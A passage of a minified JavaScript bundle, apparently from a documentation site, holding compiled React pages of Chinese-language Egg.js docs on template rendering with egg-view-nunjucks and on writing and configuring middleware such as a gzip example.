Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}n.d(t,"a",(function(){return c}));var l=n("nzxN"),o=n("ohqK");function i(e,t){if(t&&("object"===Object(l["a"])(t)||"function"===typeof t))return t;if(void 0!==t)throw new TypeError("Derived constructors may only return object or undefined");return Object(o["a"])(e)}function c(e){var t=r();return function(){var n,r=a(e);if(t){var l=a(this).constructor;n=Reflect.construct(r,arguments,l)}else n=r.apply(this,arguments);return i(this,n)}}},"/+3C":function(e,t,n){var a=n("SCbZ");e.exports=function(e){var t=a(e);if(t<0)throw RangeError("The argument can't be less than 0");return t}},"//sA":function(e,t,n){var a=n("0mt+"),r=n("JHkF"),l=Math.acosh,o=Math.log,i=Math.sqrt,c=Math.LN2,s=!l||710!=Math.floor(l(Number.MAX_VALUE))||l(1/0)!=1/0;a({target:"Math",stat:!0,forced:s},{acosh:function(e){return(e=+e)<1?NaN:e>94906265.62425156?o(e)+c:r(e-1+i(e-1)*i(e+1))}})},"/3Ig":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u7edd\u5927\u591a\u6570\u60c5\u51b5\uff0c\u6211\u4eec\u90fd\u9700\u8981\u8bfb\u53d6\u6570\u636e\u540e\u6e32\u67d3\u6a21\u677f\uff0c\u7136\u540e\u5448\u73b0\u7ed9\u7528\u6237\u3002\u6545\u6211\u4eec\u9700\u8981\u5f15\u5165\u5bf9\u5e94\u7684\u6a21\u677f\u5f15\u64ce\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," \u4f5c\u4e3a\u6a21\u677f\u89e3\u51b3\u65b9\u6848\uff0c\u5e76\u652f\u6301\u591a\u6a21\u677f\u6e32\u67d3\uff0c\u6bcf\u4e2a\u6a21\u677f\u5f15\u64ce\u90fd\u4ee5\u63d2\u4ef6\u7684\u65b9\u5f0f\u5f15\u5165\uff0c\u4f46\u4fdd\u6301\u6e32\u67d3\u7684 API \u4e00\u81f4\u3002\u5982\u679c\u60f3\u66f4\u6df1\u5165\u7684\u4e86\u89e3\uff0c\u53ef\u4ee5\u67e5\u770b",r.a.createElement(l["Link"],{to:"../advanced/view-plugin"},"\u6a21\u677f\u63d2\u4ef6\u5f00\u53d1"),"\u3002"),r.a.createElement("p",null,"\u4ee5\u4e0b\u4ee5\u5b98\u65b9\u652f\u6301\u7684 View \u63d2\u4ef6 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks")," \u4e3a\u4f8b"),r.a.createElement("h2",{id:"\u5f15\u5165-view-\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u5f15\u5165-view-\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f15\u5165 view \u63d2\u4ef6"),r.a.createElement(o["a"],{code:"$ npm i egg-view-nunjucks --save",lang:"bash"}),r.a.createElement("h3",{id:"\u542f\u7528\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u542f\u7528\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u542f\u7528\u63d2\u4ef6"),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.nunjucks = {\n  enable: true,\n  package: 'egg-view-nunjucks',\n};",lang:"js"}),r.a.createElement("h2",{id:"\u914d\u7f6e\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e\u63d2\u4ef6"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," \u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"config.view")," \u901a\u7528\u914d\u7f6e"),r.a.createElement("h3",{id:"root-string"},r.a.createElement(l["AnchorLink"],{to:"#root-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"root ","{","String","}"),r.a.createElement("p",null,"\u6a21\u677f\u6587\u4ef6\u7684\u6839\u76ee\u5f55\uff0c\u4e3a\u7edd\u5bf9\u8def\u5f84\uff0c\u9ed8\u8ba4\u4e3a ",r.a.createElement("code",null,"$","{","baseDir","}","/app/view"),"\u3002\u652f\u6301\u914d\u7f6e\u591a\u4e2a\u76ee\u5f55\uff0c\u4ee5 ",r.a.createElement("code",null,",")," \u5206\u5272\uff0c\u4f1a\u4ece\u591a\u4e2a\u76ee\u5f55\u67e5\u627e\u6587\u4ef6\u3002"),r.a.createElement("p",null,"\u5982\u4e0b\u793a\u4f8b\u6f14\u793a\u4e86\u5982\u4f55\u914d\u7f6e\u591a\u4e2a ",r.a.createElement("code",null,"view")," \u76ee\u5f55\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nconst path = require('path');\nmodule.exports = (appInfo) => {\n  const config = {};\n  config.view = {\n    root: [\n      path.join(appInfo.baseDir, 'app/view'),\n      path.join(appInfo.baseDir, 'path/to/another'),\n    ].join(','),\n  };\n  return config;\n};",lang:"js"}),r.a.createElement("h3",{id:"cache-boolean"},r.a.createElement(l["AnchorLink"],{to:"#cache-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"cache ","{","Boolean","}"),r.a.createElement("p",null,"\u6a21\u677f\u8def\u5f84\u7f13\u5b58\uff0c\u9ed8\u8ba4\u5f00\u542f\u3002\u6846\u67b6\u4f1a\u6839\u636e root \u914d\u7f6e\u7684\u76ee\u5f55\u4f9d\u6b21\u67e5\u627e\uff0c\u5982\u679c\u5339\u914d\u5219\u4f1a\u7f13\u5b58\u6587\u4ef6\u8def\u5f84\uff0c\u4e0b\u6b21\u6e32\u67d3\u76f8\u540c\u8def\u5f84\u65f6\u4e0d\u4f1a\u91cd\u65b0\u67e5\u627e\u3002"),r.a.createElement("h3",{id:"mapping-\u548c-defaultviewengine"},r.a.createElement(l["AnchorLink"],{to:"#mapping-\u548c-defaultviewengine","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"mapping \u548c defaultViewEngine"),r.a.createElement("p",null,"\u6bcf\u4e2a\u6a21\u677f\u5728\u6ce8\u518c\u65f6\u90fd\u4f1a\u6307\u5b9a\u4e00\u4e2a\u6a21\u677f\u540d\uff08viewEngineName\uff09\uff0c\u5728\u4f7f\u7528\u65f6\u9700\u8981\u6839\u636e\u540e\u7f00\u6765\u5339\u914d\u6a21\u677f\u540d\uff0c\u6bd4\u5982\u6307\u5b9a ",r.a.createElement("code",null,".nj")," \u540e\u7f00\u7684\u6587\u4ef6\u4f7f\u7528 Nunjucks \u8fdb\u884c\u6e32\u67d3\u3002"),r.a.createElement(o["a"],{code:"module.exports = {\n  view: {\n    mapping: {\n      '.nj': 'nunjucks',\n    },\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u8c03\u7528 render \u6e32\u67d3\u6587\u4ef6\u65f6\uff0c\u4f1a\u6839\u636e\u4e0a\u8ff0\u914d\u7f6e\u7684\u540e\u7f00\u540d\u53bb\u5bfb\u627e\u5bf9\u5e94\u7684\u6a21\u677f\u5f15\u64ce\u3002"),r.a.createElement(o["a"],{code:"await ctx.render('home.nj');",lang:"js"}),r.a.createElement("p",null,"\u5fc5\u987b\u914d\u7f6e\u6587\u4ef6\u540e\u7f00\u548c\u6a21\u677f\u5f15\u64ce\u7684\u6620\u5c04\uff0c\u5426\u5219\u65e0\u6cd5\u627e\u5230\u5bf9\u5e94\u7684\u6a21\u677f\u5f15\u64ce\uff0c\u4f46\u662f\u53ef\u4ee5\u4f7f\u7528 ",r.a.createElement("code",null,"defaultViewEngine")," \u505a\u5168\u5c40\u914d\u7f6e\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  view: {\n    defaultViewEngine: 'nunjucks',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5982\u679c\u6839\u636e\u6587\u4ef6\u540e\u7f00\u6ca1\u6709\u627e\u5230\u5bf9\u5e94\u7684\u6a21\u677f\u5f15\u64ce\uff0c\u4f1a\u4f7f\u7528\u9ed8\u8ba4\u7684\u6a21\u677f\u5f15\u64ce\u8fdb\u884c\u6e32\u67d3\u3002\u5bf9\u4e8e\u53ea\u4f7f\u7528\u4e00\u79cd\u6a21\u677f\u5f15\u64ce\u7684\u5e94\u7528\uff0c\u5efa\u8bae\u914d\u7f6e\u6b64\u9009\u9879\u3002"),r.a.createElement("h3",{id:"defaultextension"},r.a.createElement(l["AnchorLink"],{to:"#defaultextension","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"defaultExtension"),r.a.createElement("p",null,"\u4e00\u822c\u5728\u8c03\u7528 render \u65f6\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u9700\u8981\u5305\u542b\u6587\u4ef6\u540e\u7f00\uff0c\u5982\u679c\u914d\u7f6e\u4e86 defaultExtension \u53ef\u4ee5\u7701\u7565\u540e\u7f00\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  view: {\n    defaultExtension: '.nj',\n  },\n};\n\n// render app/view/home.nj\nawait ctx.render('home');",lang:"js"}),r.a.createElement("h2",{id:"\u6e32\u67d3\u9875\u9762"},r.a.createElement(l["AnchorLink"],{to:"#\u6e32\u67d3\u9875\u9762","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6e32\u67d3\u9875\u9762"),r.a.createElement("p",null,"\u6846\u67b6\u5728 Context \u4e0a\u63d0\u4f9b\u4e86 3 \u4e2a\u63a5\u53e3\uff0c\u8fd4\u56de\u503c\u5747\u4e3a Promise:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"render(name, locals)")," \u6e32\u67d3\u6a21\u677f\u6587\u4ef6, \u5e76\u8d4b\u503c\u7ed9 ctx.body"),r.a.createElement("li",null,r.a.createElement("code",null,"renderView(name, locals)")," \u6e32\u67d3\u6a21\u677f\u6587\u4ef6, \u4ec5\u8fd4\u56de\u4e0d\u8d4b\u503c"),r.a.createElement("li",null,r.a.createElement("code",null,"renderString(tpl, locals)")," \u6e32\u67d3\u6a21\u677f\u5b57\u7b26\u4e32, \u4ec5\u8fd4\u56de\u4e0d\u8d4b\u503c")),r.a.createElement(o["a"],{code:"// {app_root}/app/controller/home.js\nclass HomeController extends Controller {\n  async index() {\n    const data = { name: 'egg' };\n\n    // render a template, path relate to `app/view`\n    await ctx.render('home/index.tpl', data);\n\n    // or manually set render result to ctx.body\n    ctx.body = await ctx.renderView('path/to/file.tpl', data);\n\n    // or render string directly\n    ctx.body = await ctx.renderString('hi, {{ name }}', data, {\n      viewEngine: 'nunjucks',\n    });\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u5f53\u4f7f\u7528 ",r.a.createElement("code",null,"renderString")," \u65f6\u9700\u8981\u6307\u5b9a\u6a21\u677f\u5f15\u64ce\uff0c\u5982\u679c\u5df2\u7ecf\u5b9a\u4e49 ",r.a.createElement("code",null,"defaultViewEngine")," \u8fd9\u91cc\u53ef\u4ee5\u7701\u7565\u3002"),r.a.createElement("h2",{id:"locals"},r.a.createElement(l["AnchorLink"],{to:"#locals","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Locals"),r.a.createElement("p",null,"\u5728\u6e32\u67d3\u9875\u9762\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u901a\u5e38\u9700\u8981\u4e00\u4e2a\u53d8\u91cf\u6765\u6536\u96c6\u9700\u8981\u4f20\u9012\u7ed9\u6a21\u677f\u7684\u53d8\u91cf\uff0c\u5728\u6846\u67b6\u91cc\u9762\uff0c\u6211\u4eec\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"app.locals")," \u548c ",r.a.createElement("code",null,"ctx.locals"),"\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.locals")," \u4e3a\u5168\u5c40\u7684\uff0c\u4e00\u822c\u5728 ",r.a.createElement("code",null,"app.js")," \u91cc\u9762\u914d\u7f6e\u5168\u5c40\u53d8\u91cf\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.locals")," \u4e3a\u5355\u6b21\u8bf7\u6c42\u7684\uff0c\u4f1a\u5408\u5e76 ",r.a.createElement("code",null,"app.locals"),"\u3002"),r.a.createElement("li",null,"\u53ef\u4ee5\u76f4\u63a5\u8d4b\u503c\u5bf9\u8c61\uff0c\u6846\u67b6\u5728\u5bf9\u5e94\u7684 setter \u91cc\u9762\u4f1a\u81ea\u52a8 merge\u3002")),r.a.createElement(o["a"],{code:"// `app.locals` \u4f1a\u5408\u5e76\u5230 `ctx.locals\nctx.app.locals = { a: 1 };\nctx.locals.b = 2;\nconsole.log(ctx.locals); // { a: 1, b: 2 }\n\n// \u4e00\u6b21\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\uff0c\u4ec5\u4f1a\u5728\u7b2c\u4e00\u6b21\u4f7f\u7528 `ctx.locals` \u65f6\u628a `app.locals` \u5408\u5e76\u8fdb\u53bb\u3002\nctx.app.locals = { a: 2 };\nconsole.log(ctx.locals); // \u4e0a\u9762\u5df2\u7ecf\u5408\u5e76\u8fc7\u4e00\u6b21\uff0c\u6545\u8f93\u51fa\u8fd8\u662f { a: 1, b: 2 }\n\n// \u4e5f\u53ef\u4ee5\u76f4\u63a5\u8d4b\u503c\u6574\u4e2a\u5bf9\u8c61\uff0c\u4e0d\u7528\u62c5\u5fc3\u4f1a\u8986\u76d6\u524d\u9762\u7684\u503c\uff0c\u6211\u4eec\u901a\u8fc7 setter \u505a\u4e86\u81ea\u52a8\u5408\u5e76\u3002\nctx.locals.c = 3;\nctx.locals = { d: 4 };\nconsole.log(ctx.locals); // { a: 1, b: 2, c: 3, d: 4 }",lang:"js"}),r.a.createElement("p",null,"\u4f46\u5728\u5b9e\u9645\u4e1a\u52a1\u5f00\u53d1\u4e2d\uff0ccontroller \u4e2d\u4e00\u822c\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528\u8fd9 2 \u4e2a\u5bf9\u8c61\uff0c\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"ctx.render(name, data)")," \u5373\u53ef\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6846\u67b6\u4f1a\u81ea\u52a8\u628a ",r.a.createElement("code",null,"data")," \u5408\u5e76\u5230 ",r.a.createElement("code",null,"ctx.locals"),"\u3002"),r.a.createElement("li",null,"\u6846\u67b6\u4f1a\u81ea\u52a8\u6ce8\u5165 ",r.a.createElement("code",null,"ctx"),", ",r.a.createElement("code",null,"request"),", ",r.a.createElement("code",null,"helper")," \u65b9\u4fbf\u4f7f\u7528\u3002")),r.a.createElement(o["a"],{code:"ctx.app.locals = { appName: 'showcase' };\nconst data = { name: 'egg' };\n\n// will auto merge `data` to `ctx.locals`, output: egg - showcase\nawait ctx.renderString('{{ name }} - {{ appName }}', data);\n\n// helper, ctx, request will auto inject\nawait ctx.renderString(\n  '{{ name }} - {{ helper.lowercaseFirst(ctx.app.config.baseDir) }}',\n  data,\n);",lang:"js"}),r.a.createElement("p",null,"\u6ce8\u610f\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("strong",null,"ctx.locals \u6709\u7f13\u5b58\uff0c\u53ea\u5728\u7b2c\u4e00\u6b21\u8bbf\u95ee ctx.locals \u65f6\u5408\u5e76 app.locals\u3002")),r.a.createElement("li",null,"\u539f Koa \u4e2d\u7684 ",r.a.createElement("code",null,"ctx.state"),"\uff0c\u7531\u4e8e\u5bb9\u6613\u4ea7\u751f\u6b67\u4e49\uff0c\u5728\u6846\u67b6\u4e2d\u88ab\u8986\u76d6\u4e3a locals\uff0c\u5373 ",r.a.createElement("code",null,"ctx.state")," \u548c ",r.a.createElement("code",null,"ctx.locals")," \u7b49\u4ef7\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u540e\u8005\u3002")),r.a.createElement("h2",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Helper"),r.a.createElement("p",null,"\u5728\u6a21\u677f\u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"helper")," \u4e0a\u6ce8\u518c\u7684\u65b9\u6cd5\uff0c\u5177\u4f53\u53ef\u4ee5\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../basics/extend"},"\u6269\u5c55"),"\u3002"),r.a.createElement(o["a"],{code:"// app/extend/helper.js\nexports.lowercaseFirst = (str) => str[0].toLowerCase() + str.substring(1);\n\n// app/controller/home.js\nawait ctx.renderString('{{ helper.lowercaseFirst(name) }}', data);",lang:"js"}),r.a.createElement("h2",{id:"security"},r.a.createElement(l["AnchorLink"],{to:"#security","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Security"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security")," \u63d2\u4ef6\uff0c\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u5e38\u89c1\u7684\u5b89\u5168\u8f85\u52a9\u51fd\u6570\uff0c\u5305\u62ec ",r.a.createElement("code",null,"helper.shtml / surl / sjs")," \u7b49\u7b49\u7b49\uff0c\u5f3a\u70c8\u5efa\u8bae\u9605\u8bfb\u4e0b",r.a.createElement(l["Link"],{to:"./security"},"\u5b89\u5168"),"\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"/5sn":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u5728",r.a.createElement(l["Link"],{to:"../intro/egg-and-koa"},"\u524d\u9762\u7684\u7ae0\u8282"),"\u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86 Egg \u662f\u57fa\u4e8e Koa \u5b9e\u73b0\u7684\uff0c\u6240\u4ee5 Egg \u7684\u4e2d\u95f4\u4ef6\u5f62\u5f0f\u548c Koa \u7684\u4e2d\u95f4\u4ef6\u5f62\u5f0f\u662f\u4e00\u6837\u7684\uff0c\u90fd\u662f\u57fa\u4e8e",r.a.createElement(l["AnchorLink"],{to:"../intro/egg-and-koa#middleware"},"\u6d0b\u8471\u5708\u6a21\u578b"),"\u3002\u6bcf\u6b21\u6211\u4eec\u7f16\u5199\u4e00\u4e2a\u4e2d\u95f4\u4ef6\uff0c\u5c31\u76f8\u5f53\u4e8e\u5728\u6d0b\u8471\u5916\u9762\u5305\u4e86\u4e00\u5c42\u3002"),r.a.createElement("h2",{id:"\u7f16\u5199\u4e2d\u95f4\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u7f16\u5199\u4e2d\u95f4\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f16\u5199\u4e2d\u95f4\u4ef6"),r.a.createElement("h3",{id:"\u5199\u6cd5"},r.a.createElement(l["AnchorLink"],{to:"#\u5199\u6cd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5199\u6cd5"),r.a.createElement("p",null,"\u6211\u4eec\u5148\u6765\u901a\u8fc7\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684 gzip \u4e2d\u95f4\u4ef6\uff0c\u6765\u770b\u770b\u4e2d\u95f4\u4ef6\u7684\u5199\u6cd5\u3002"),r.a.createElement(o["a"],{code:"// app/middleware/gzip.js\nconst isJSON = require('koa-is-json');\nconst zlib = require('zlib');\n\nasync function gzip(ctx, next) {\n  await next();\n\n  // \u540e\u7eed\u4e2d\u95f4\u4ef6\u6267\u884c\u5b8c\u6210\u540e\u5c06\u54cd\u5e94\u4f53\u8f6c\u6362\u6210 gzip\n  let body = ctx.body;\n  if (!body) return;\n  if (isJSON(body)) body = JSON.stringify(body);\n\n  // \u8bbe\u7f6e gzip body\uff0c\u4fee\u6b63\u54cd\u5e94\u5934\n  const stream = zlib.createGzip();\n  stream.end(body);\n  ctx.body = stream;\n  ctx.set('Content-Encoding', 'gzip');\n}",lang:"js"}),r.a.createElement("p",null,"\u53ef\u4ee5\u770b\u5230\uff0c\u6846\u67b6\u7684\u4e2d\u95f4\u4ef6\u548c Koa \u7684\u4e2d\u95f4\u4ef6\u5199\u6cd5\u662f\u4e00\u6a21\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u4efb\u4f55 Koa \u7684\u4e2d\u95f4\u4ef6\u90fd\u53ef\u4ee5\u76f4\u63a5\u88ab\u6846\u67b6\u4f7f\u7528\u3002"),r.a.createElement("h3",{id:"\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e"),r.a.createElement("p",null,"\u4e00\u822c\u6765\u8bf4\u4e2d\u95f4\u4ef6\u4e5f\u4f1a\u6709\u81ea\u5df1\u7684\u914d\u7f6e\u3002\u5728\u6846\u67b6\u4e2d\uff0c\u4e00\u4e2a\u5b8c\u6574\u7684\u4e2d\u95f4\u4ef6\u662f\u5305\u542b\u4e86\u914d\u7f6e\u5904\u7406\u7684\u3002\u6211\u4eec\u7ea6\u5b9a\u4e00\u4e2a\u4e2d\u95f4\u4ef6\u662f\u4e00\u4e2a\u653e\u7f6e\u5728 ",r.a.createElement("code",null,"app/middleware")," \u76ee\u5f55\u4e0b\u7684\u5355\u72ec\u6587\u4ef6\uff0c\u5b83\u9700\u8981 exports \u4e00\u4e2a\u666e\u901a\u7684 function\uff0c\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"options: \u4e2d\u95f4\u4ef6\u7684\u914d\u7f6e\u9879\uff0c\u6846\u67b6\u4f1a\u5c06 ",r.a.createElement("code",null,"app.config[$","{","middlewareName","}","]")," \u4f20\u9012\u8fdb\u6765\u3002"),r.a.createElement("li",null,"app: \u5f53\u524d\u5e94\u7528 Application \u7684\u5b9e\u4f8b\u3002")),r.a.createElement("p",null,"\u6211\u4eec\u5c06\u4e0a\u9762\u7684 gzip \u4e2d\u95f4\u4ef6\u505a\u4e00\u4e2a\u7b80\u5355\u7684\u4f18\u5316\uff0c\u8ba9\u5b83\u652f\u6301\u6307\u5b9a\u53ea\u6709\u5f53 body \u5927\u4e8e\u914d\u7f6e\u7684 threshold \u65f6\u624d\u8fdb\u884c gzip \u538b\u7f29\uff0c\u6211\u4eec\u8981\u5728 ",r.a.createElement("code",null,"app/middleware")," \u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6 ",r.a.createElement("code",null,"gzip.js")),r.a.createElement(o["a"],{code:"// app/middleware/gzip.js\nconst isJSON = require('koa-is-json');\nconst zlib = require('zlib');\n\nmodule.exports = (options) => {\n  return async function gzip(ctx, next) {\n    await next();\n\n    // \u540e\u7eed\u4e2d\u95f4\u4ef6\u6267\u884c\u5b8c\u6210\u540e\u5c06\u54cd\u5e94\u4f53\u8f6c\u6362\u6210 gzip\n    let body = ctx.body;\n    if (!body) return;\n\n    // \u652f\u6301 options.threshold\n    if (options.threshold && ctx.length < options.threshold) return;\n\n    if (isJSON(body)) body = JSON.stringify(body);\n\n    // \u8bbe\u7f6e gzip body\uff0c\u4fee\u6b63\u54cd\u5e94\u5934\n    const stream = zlib.createGzip();\n    stream.end(body);\n    ctx.body = stream;\n    ctx.set('Content-Encoding', 'gzip');\n  };\n};",lang:"js"}),r.a.createElement("h2",{id:"\u4f7f\u7528\u4e2d\u95f4\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528\u4e2d\u95f4\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528\u4e2d\u95f4\u4ef6"),r.a.createElement("p",null,"\u4e2d\u95f4\u4ef6\u7f16\u5199\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u624b\u52a8\u6302\u8f7d\uff0c\u652f\u6301\u4ee5\u4e0b\u65b9\u5f0f\uff1a"),r.a.createElement("h3",{id:"\u5728\u5e94\u7528\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u5728\u5e94\u7528\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5728\u5e94\u7528\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6"),r.a.createElement("p",null,"\u5728\u5e94\u7528\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5b8c\u5168\u901a\u8fc7\u914d\u7f6e\u6765\u52a0\u8f7d\u81ea\u5b9a\u4e49\u7684\u4e2d\u95f4\u4ef6\uff0c\u5e76\u51b3\u5b9a\u5b83\u4eec\u7684\u987a\u5e8f\u3002"),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u9700\u8981\u52a0\u8f7d\u4e0a\u9762\u7684 gzip \u4e2d\u95f4\u4ef6\uff0c\u5728 ",r.a.createElement("code",null,"config.default.js")," \u4e2d\u52a0\u5165\u4e0b\u9762\u7684\u914d\u7f6e\u5c31\u5b8c\u6210\u4e86\u4e2d\u95f4\u4ef6\u7684\u5f00\u542f\u548c\u914d\u7f6e\uff1a"),r.a.createElement(o["a"],{code:"module.exports = {\n  // \u914d\u7f6e\u9700\u8981\u7684\u4e2d\u95f4\u4ef6\uff0c\u6570\u7ec4\u987a\u5e8f\u5373\u4e3a\u4e2d\u95f4\u4ef6\u7684\u52a0\u8f7d\u987a\u5e8f\n  middleware: ['gzip'],\n\n  // \u914d\u7f6e gzip \u4e2d\u95f4\u4ef6\u7684\u914d\u7f6e\n  gzip: {\n    threshold: 1024, // \u5c0f\u4e8e 1k \u7684\u54cd\u5e94\u4f53\u4e0d\u538b\u7f29\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u8be5\u914d\u7f6e\u6700\u7ec8\u5c06\u5728\u542f\u52a8\u65f6\u5408\u5e76\u5230 ",r.a.createElement("code",null,"app.config.appMiddleware"),"\u3002"),r.a.createElement("h3",{id:"\u5728\u6846\u67b6\u548c\u63d2\u4ef6\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u5728\u6846\u67b6\u548c\u63d2\u4ef6\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5728\u6846\u67b6\u548c\u63d2\u4ef6\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6"),r.a.createElement("p",null,"\u6846\u67b6\u548c\u63d2\u4ef6\u4e0d\u652f\u6301\u5728 ",r.a.createElement("code",null,"config.default.js")," \u4e2d\u5339\u914d ",r.a.createElement("code",null,"middleware"),"\uff0c\u9700\u8981\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\uff1a"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  // \u5728\u4e2d\u95f4\u4ef6\u6700\u524d\u9762\u7edf\u8ba1\u8bf7\u6c42\u65f6\u95f4\n  app.config.coreMiddleware.unshift('report');\n};\n\n// app/middleware/report.js\nmodule.exports = () => {\n  return async function (ctx, next) {\n    const startTime = Date.now();\n    await next();\n    // \u4e0a\u62a5\u8bf7\u6c42\u65f6\u95f4\n    reportTime(Date.now() - startTime);\n  };\n};",lang:"js"}),r.a.createElement("p",null,"\u5e94\u7528\u5c42\u5b9a\u4e49\u7684\u4e2d\u95f4\u4ef6\uff08",r.a.createElement("code",null,"app.config.appMiddleware"),"\uff09\u548c\u6846\u67b6\u9ed8\u8ba4\u4e2d\u95f4\u4ef6\uff08",r.a.createElement("code",null,"app.config.coreMiddleware"),"\uff09\u90fd\u4f1a\u88ab\u52a0\u8f7d\u5668\u52a0\u8f7d\uff0c\u5e76\u6302\u8f7d\u5230 ",r.a.createElement("code",null,"app.middleware")," \u4e0a\u3002"),r.a.createElement("h3",{id:"router-\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#router-\u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"router \u4e2d\u4f7f\u7528\u4e2d\u95f4\u4ef6"),r.a.createElement("p",null,"\u4ee5\u4e0a\u4e24\u79cd\u65b9\u5f0f\u914d\u7f6e\u7684\u4e2d\u95f4\u4ef6\u662f\u5168\u5c40\u7684\uff0c\u4f1a\u5904\u7406\u6bcf\u4e00\u6b21\u8bf7\u6c42\u3002 